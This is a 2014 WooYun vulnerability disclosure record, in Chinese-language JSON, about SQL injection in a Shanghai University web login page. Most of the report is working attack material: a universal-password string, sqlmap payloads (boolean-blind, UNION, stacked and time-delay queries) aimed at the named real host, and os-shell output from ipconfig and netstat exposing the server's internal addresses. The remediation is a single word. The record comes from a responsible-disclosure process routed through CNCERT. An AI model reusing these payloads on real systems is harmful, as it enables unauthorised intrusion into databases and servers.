{"id": 57969, "wybug_id": "wooyun-2014-052734", "wybug_title": "上海大学某站点sql注入", "wybug_corp": "上海大学", "wybug_author": "m_vptr", "wybug_date": "2014-03-05 16:59", "wybug_open_date": "2014-06-03 17:00", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-03：\t细节向公众公开  简要描述： SQL注入，可获得os-shell 详细说明：  http://wkf.shu.edu.cn/login.aspx 登录框存在sql注入，直接用万能密码'or'a'='a可测试。   漏洞证明：  扫描报告\nsqlmap identified the following injection points with a total of 80 HTTP(s) requests:---Place: POSTParameter: txtUserName    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: __VIEWSTATE=/wEPDwULLTE5NDQ1ODY5NTRkZEgimj07AXJcb1obgvPpmKTRdyUp&__EVENTVALIDATION=/wEWBQLlwpigCQKl1bKzCQK1qbT2CQKM54rGBgK7q7GGCKv3JJkgpaefIUz+4BHuMULXdWEU&txtUserName='or'a'='a'; IF(8505=8505) SELECT 8505 ELSE DROP FUNCTION qbxE--&txtpassword='or'a'='a&Button1= %E7%99%BB %E5%BD%95     Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: __VIEWSTATE=/wEPDwULLTE5NDQ1ODY5NTRkZEgimj07AXJcb1obgvPpmKTRdyUp&__EVENTVALIDATION=/wEWBQLlwpigCQKl1bKzCQK1qbT2CQKM54rGBgK7q7GGCKv3JJkgpaefIUz+4BHuMULXdWEU&txtUserName='or'a'='a' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113) CHAR(108) CHAR(104) CHAR(106) CHAR(113) CHAR(89) CHAR(70) CHAR(104) CHAR(118) CHAR(89) CHAR(110) CHAR(117) CHAR(120) CHAR(101) CHAR(121) CHAR(113) CHAR(120) CHAR(113) CHAR(114) CHAR(113),NULL,NULL-- &txtpassword='or'a'='a&Button1= %E7%99%BB %E5%BD%95     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwULLTE5NDQ1ODY5NTRkZEgimj07AXJcb1obgvPpmKTRdyUp&__EVENTVALIDATION=/wEWBQLlwpigCQKl1bKzCQK1qbT2CQKM54rGBgK7q7GGCKv3JJkgpaefIUz+4BHuMULXdWEU&txtUserName='or'a'='a'; WAITFOR DELAY '0:0:5'--&txtpassword='or'a'='a&Button1= %E7%99%BB %E5%BD%95     Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwULLTE5NDQ1ODY5NTRkZEgimj07AXJcb1obgvPpmKTRdyUp&__EVENTVALIDATION=/wEWBQLlwpigCQKl1bKzCQK1qbT2CQKM54rGBgK7q7GGCKv3JJkgpaefIUz+4BHuMULXdWEU&txtUserName='or'a'='a' WAITFOR DELAY '0:0:5'--&txtpassword='or'a'='a&Button1= %E7%99%BB %E5%BD%95\nipconfig\ncommand standard output:                                                                                                                                                       ---Windows IP 配置  以太网适配器 本地连接 3:  \\?a0\\?a0连接特定的 DNS 后缀 . . . . . . . :    连接特定的 DNS 后缀 . . . . . . . :  \\?a0\\?a0本地链接 IPv6 地址. . . . . . . . : fe80::1916:3637:8c99:625   本地链接 IPv6 地址. . . . . . . . : fe80::1916:3637:8c99:625 \\?a0\\?a0IPv4 地址 . . . . . . . . . . . . : 169.254.95.119   IPv4 地址 . . . . . . . . . . . . : 169.254.95.119 \\?a0\\?a0子网掩码 \\?a0. . . . . . . . . . . . : 255.255.0.0   子网掩码  . . . . . . . . . . . . : 255.255.0.0 \\?a0\\?a0默认网关. . . . . . . . . . . . . :    默认网关. . . . . . . . . . . . . :  以太网适配器 本地连接 2:  \\?a0\\?a0连接特定的 DNS 后缀 . . . . . . . : shu.edu.cn   连接特定的 DNS 后缀 . . . . . . . : shu.edu.cn \\?a0\\?a0IPv6 地址 . . . . . . . . . . . . : 2001:da8:8006:445:8852:db0a:71b:fc5d   IPv6 地址 . . . . . . . . . . . . : 2001:da8:8006:445:8852:db0a:71b:fc5d \\?a0\\?a0本地链接 IPv6 地址. . . . . . . . : fe80::8852:db0a:71b:fc5d   本地链接 IPv6 地址. . . . . . . . : fe80::8852:db0a:71b:fc5d \\?a0\\?a0IPv4 地址 . . . . . . . . . . . . : 111.186.98.194   IPv4 地址 . . . . . . . . . . . . : 111.186.98.194 \\?a0\\?a0子网掩码 \\?a0. . . . . . . . . . . . : 255.255.255.128   子网掩码  . . . . . . . . . . . . : 255.255.255.128 \\?a0\\?a0默认网关. . . . . . . . . . . . . : fe80::225:9eff:fe5c:9ebf   默认网关. . . . . . . . . . . . . : fe80::225:9eff:fe5c:9ebf \\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0111.186.98.254                                       111.186.98.254 以太网适配器 本地连接:  \\?a0\\?a0连接特定的 DNS 后缀 . . . . . . . : shu.edu.cn   连接特定的 DNS 后缀 . . . . . . . : shu.edu.cn \\?a0\\?a0IPv6 地址 . . . . . . . . . . . . : 2001:da8:8006:445:a883:b9ae:2bbb:2e62   IPv6 地址 . . . . . . . . . . . . : 2001:da8:8006:445:a883:b9ae:2bbb:2e62 \\?a0\\?a0本地链接 IPv6 地址. . . . . . . . : fe80::a883:b9ae:2bbb:2e62   本地链接 IPv6 地址. . . . . . . . : fe80::a883:b9ae:2bbb:2e62 \\?a0\\?a0IPv4 地址 . . . . . . . . . . . . : 111.186.98.193   IPv4 地址 . . . . . . . . . . . . : 111.186.98.193 \\?a0\\?a0子网掩码 \\?a0. . . . . . . . . . . . : 255.255.255.128   子网掩码  . . . . . . . . . . . . : 255.255.255.128 \\?a0\\?a0默认网关. . . . . . . . . . . . . : fe80::225:9eff:fe5c:9ebf   默认网关. . . . . . . . . . . . . : fe80::225:9eff:fe5c:9ebf \\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0111.186.98.254                                       111.186.98.254 隧道适配器 本地连接* 8:  \\?a0\\?a0媒体状态 \\?a0. . . . . . . . . . . . : 媒体已断开   媒体状态  . . . . . . . . . . . . : 媒体已断开 \\?a0\\?a0连接特定的 DNS 后缀 . . . . . . . :    连接特定的 DNS 后缀 . . . . . . . :  ---\nnetstat\n活动连接  \\?a0协议 \\?a0本地地址 \\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0外部地址 \\?a0\\?a0\\?a0\\?a0\\?a0\\?a0\\?a0状态  协议  本地地址          外部地址        状态 \\?a0TCP \\?a0\\?a0\\?a0111.186.98.193:80 \\?a0\\?a0\\?a0\\?a0\\?a010.105.1.200:13575 \\?a0\\?a0\\?a0\\?a0ESTABLISHED略。。。\n   修复方案：  过滤   版权声明：转载请注明来源 m_vptr@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-03-10 21:16 厂商回复： 已经转由CNCERT通报给教育网应急组织处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}